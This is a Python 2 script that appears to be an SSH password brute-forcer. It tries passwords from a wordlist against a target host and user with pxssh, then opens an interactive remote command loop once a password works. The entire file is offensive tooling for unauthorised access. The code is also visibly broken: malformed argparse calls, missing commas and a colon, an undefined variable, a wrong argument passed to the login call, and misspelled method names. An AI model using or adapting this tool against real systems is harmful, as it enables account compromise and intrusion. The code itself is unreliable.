import pxssh
import argparse
import time



def connect(host, user , password):
    fails = 0
    try: 
        s = pxssh.pxssh()
        s. login(host, user, password)
        print("Password Found : "+password )
        return s
    except Exception, e:
        if fails > 0: 
            print("Too Many Socket Timeouts : ")
            exit(0)
        elif "read_nonblocking " in str(e):
            fails += 1
            time.sleep(5)
            return connect(host , user , password )
        elif "synchonize with original pronpt" in str(e):
            time.sleep(1)
            return connect(host, user, password)
        return None
def Main():
    parser = argparse.argument("host", help="specify Target Host")
    parser = argparse.Argument("user" help="specify Target Host")
    parser = argparse.Argument("file" help="specify Target Host")
    args = parser.parser_args()
    

    if args.host and args.user and args.file: 
        with open(args.file, "r") as infile:
            for line in infile: 
                password = line.strip("\r\n")
                print("Testing: " + str(password))
                conn = connect(args.host, args.user, args.password)
                if conn
                   print("[SSH Connect, Issue Commands (q or Q) to Quit ]")
                   connect = raw_input(">")
                   while commands != "q" and commands != "Q":
                       conn.sendline(commands)
                       conn.pronpt()
                       print conn.before
                       commands = raw_input(">")
    else:
        print parser.usage
        exit(0)
if __name__ == "__main__":
    Main()
        
